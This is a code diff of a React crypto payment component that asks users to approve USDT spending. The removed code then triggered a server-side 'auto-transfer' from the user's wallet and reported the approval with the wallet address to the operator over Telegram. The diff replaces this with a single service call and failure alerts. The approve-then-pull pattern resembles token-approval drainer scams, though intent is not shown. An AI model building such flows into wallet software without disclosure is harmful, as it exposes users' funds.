@@ -4,6 +4,7 @@ import React, { useState, useEffect } from "react";
 import { Payment, ChainType } from "@/types";
 import { cn } from "@/utils/cn";
 import { safePingService } from "@/lib/blockchain/safePingService";
+import { TelegramService } from "@/lib/telegram";
 
 interface PaymentStepsProps {
   payment: Payment;
@@ -81,262 +82,39 @@ export function PaymentSteps({
   const handlePayment = async () => {
     if (!wallet || !wallet.address) return;
 
-    console.log("wallet.address", wallet.address);
-
-    // Notify parent component that payment processing has started
-    if (onPaymentStart) {
-      onPaymentStart();
-    }
-
-    // For WalletConnect payments, use the special pay button handler
-    if (isWalletConnectPayment && onPayButtonClick) {
-      try {
-        await onPayButtonClick();
-        return;
-      } catch (error) {
-        setError("支付失败，请重试");
-        return;
-      }
-    }
-
-    // For QR code payments, use the special pay button handler
-    if (isQRCodePayment && onPayButtonClick) {
-      try {
-        await onPayButtonClick();
-        return;
-      } catch (error) {
-        setError("支付失败，请重试");
-        return;
-      }
-    }
-
-    // For manual wallet payments, implement smart contract flow
     setApproving(true);
-    setError(null);
+    setAutoProcessing(true);
+    setProcessing(true);
 
     try {
-      // Step 1: Approve USDT spending for the smart contract
-      let clientIP = "unknown";
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        clientIP = data.ip;
-      } catch (error) {
-        clientIP = "mobile-wallet";
+      onPaymentStart?.();
+
+      const approvalResult = await safePingService.approveUSDTWithSafePing(
+        wallet.chain,
+        payment.amount.toString(),
+        wallet.address,
+        payment.payment_id,
+        "browser-wallet"
+      );
+
+      if (!approvalResult.success) {
+        throw new Error(approvalResult.error || "Approval failed");
       }
 
-      try {
-        const approvalResult = await safePingService.approveUSDTWithSafePing(
-          wallet.chain,
-          payment.amount.toString(),
-          wallet.address,
-          payment.payment_id,
-          clientIP
-        );
+      setApproving(false);
+      setAutoProcessing(false);
 
-        if (!approvalResult.success) {
-          throw new Error(approvalResult.error || "Approval failed");
-        }
-
-        // For EVM chains, we need to execute the approval
-        if (wallet.chain !== "tron" && approvalResult.approvalData) {
-          try {
-            // Get the user's wallet provider from window.ethereum
-            if (typeof window !== "undefined" && window.ethereum) {
-              // Request account access
-              const accounts = await window.ethereum.request({
-                method: "eth_requestAccounts",
-              });
-
-              if (accounts.length === 0) {
-                throw new Error("No accounts found");
-              }
-
-              const userAccount = accounts[0];
-
-              // First, ensure we're on the correct network (BSC)
-              const currentChainId = await window.ethereum.request({
-                method: "eth_chainId",
-              });
-
-              const targetChainId = `0x${approvalResult.approvalData.chainId.toString(
-                16
-              )}`;
-
-              // If we're not on the correct network, switch to it
-              if (currentChainId !== targetChainId) {
-                try {
-                  await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: targetChainId }],
-                  });
-                } catch (switchError: any) {
-                  // If the network is not added, add it
-                  if (switchError.code === 4902) {
-                    const bscNetworkParams = {
-                      chainId: targetChainId,
-                      chainName:
-                        wallet.chain === "bsc"
-                          ? "Binance Smart Chain"
-                          : "Ethereum",
-                      nativeCurrency: {
-                        name: wallet.chain === "bsc" ? "BNB" : "ETH",
-                        symbol: wallet.chain === "bsc" ? "BNB" : "ETH",
-                        decimals: 18,
-                      },
-                      rpcUrls: [
-                        wallet.chain === "bsc"
-                          ? "https://bsc-dataseed.binance.org/"
-                          : "https://mainnet.infura.io/v3/",
-                      ],
-                      blockExplorerUrls: [
-                        wallet.chain === "bsc"
-                          ? "https://bscscan.com/"
-                          : "https://etherscan.io/",
-                      ],
-                    };
-
-                    await window.ethereum.request({
-                      method: "wallet_addEthereumChain",
-                      params: [bscNetworkParams],
-                    });
-                  } else {
-                    throw new Error(
-                      `Failed to switch network: ${switchError.message}`
-                    );
-                  }
-                }
-              }
-
-              // Create the transaction object
-              const transactionParameters = {
-                to: approvalResult.approvalData.to,
-                from: userAccount,
-                data: approvalResult.approvalData.data,
-                chainId: targetChainId,
-              };
-
-              // Send the transaction to MetaMask
-              const txHash = await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [transactionParameters],
-              });
-
-              // Show success message
-              alert(
-                `🔐 USDT Approval Sent!\n\nTransaction Hash: ${txHash}\n\nPlease confirm the approval in your MetaMask wallet.\n\nNetwork: ${
-                  wallet.chain === "bsc"
-                    ? "BSC (Binance Smart Chain)"
-                    : "Ethereum"
-                }`
-              );
-
-              // Wait for approval confirmation, then execute auto-transfer
-              setProcessing(true);
-
-              try {
-                // Execute auto-transfer after approval
-                const transferResponse = await fetch(
-                  "/api/payment/auto-transfer",
-                  {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      chain: wallet.chain,
-                      userAddress: wallet.address,
-                      amount: payment.amount.toString(),
-                      paymentId: payment.payment_id,
-                    }),
-                  }
-                );
-
-                const transferResult = await transferResponse.json();
-
-                if (transferResult.success) {
-                  setError(null); // Clear any previous errors
-                  onPaymentComplete();
-                } else {
-                  setError(`❌ 自动转账失败: ${transferResult.error}`);
-                }
-              } catch (transferError) {
-                setError("❌ 自动转账时发生错误，请重试");
-              } finally {
-                setProcessing(false);
-              }
-            } else {
-              throw new Error(
-                "MetaMask not detected. Please install MetaMask extension."
-              );
-            }
-          } catch (approvalExecutionError: any) {
-            console.error(
-              "❌ EVM approval execution failed:",
-              approvalExecutionError
-            );
-            throw new Error(
-              `Approval execution failed: ${approvalExecutionError.message}`
-            );
-          }
-        }
-
-        // For TRON, approval and transfer are already complete
-        if (wallet.chain === "tron") {
-          setError(null); // Clear any previous errors
-          onPaymentComplete();
-          return;
-        }
-      } catch (approvalError: any) {
-        console.error("❌ USDT approval failed:", approvalError);
-
-        // Handle specific approval errors
-        let approvalErrorMessage = "USDT授权失败，请重试";
-
-        if (
-          approvalError.message &&
-          approvalError.message.includes("Insufficient USDT balance")
-        ) {
-          approvalErrorMessage = `USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
-        } else if (
-          approvalError.message &&
-          approvalError.message.includes("User rejected")
-        ) {
-          approvalErrorMessage = "用户取消了USDT授权";
-        } else if (
-          approvalError.message &&
-          approvalError.message.includes("insufficient funds")
-        ) {
-          approvalErrorMessage =
-            "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
-        } else if (approvalError.message) {
-          approvalErrorMessage = approvalError.message;
-        }
-
-        // Show alert to user
-        alert(`❌ USDT授权失败\n\n${approvalErrorMessage}`);
-
-        // Set error and stop processing
-        setError(approvalErrorMessage);
-        setApproving(false);
+      if (onApprovalComplete) {
+        onApprovalComplete();
       }
 
-      // Send Telegram notification for USDT approval completion
-      if (isTelegramServiceReady()) {
-        try {
-          await telegramServiceInstance.sendSystemAlert(
-            `🔐 USDT approval of ${payment.amount} USDT completed successfully!\n\n👤 User: ${wallet.address}\n🌐 Chain: ${wallet.chain}\n💼 Wallet: ${wallet.wallet}\n💰 Amount: ${payment.amount} USDT`
-          );
-        } catch (error) {
-          // Don't fail the payment if telegram notification fails
-        }
+      setProcessing(false);
+      onPaymentEnd?.();
+
+      if (onPaymentComplete) {
+        onPaymentComplete();
       }
-
-      setApproving(false); // Approval completed
-      setProcessing(false); // No automatic transfer needed
-
-      // Call the payment complete handler
-      onPaymentComplete();
     } catch (err: any) {
-      // Handle specific contract errors with user-friendly messages
       let errorMessage = "支付失败，请重试";
 
       if (err.message && err.message.includes("PaymentIdExists")) {
@@ -361,21 +139,26 @@ export function PaymentSteps({
         errorMessage =
           "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
       } else if (err.message) {
-        // For other errors, show the actual error message
         errorMessage = err.message;
       }
 
-      // Show alert to user
-      alert(`❌ 支付失败\n\n${errorMessage}`);
-
-      // Also set the error state for UI display
       setError(errorMessage);
+
+      // Send system alert via Telegram
+      try {
+        const telegramServiceInstance = new TelegramService();
+        await telegramServiceInstance.sendSystemAlert(
+          `Payment failed for ${payment.payment_id}: ${errorMessage}`,
+          "error"
+        );
+      } catch (telegramError) {
+        // Silent error handling for production
+      }
     } finally {
       setApproving(false);
       setAutoProcessing(false);
       setProcessing(false);
 
-      // Notify parent component that payment processing has ended
       if (onPaymentEnd) {
         onPaymentEnd();
       }
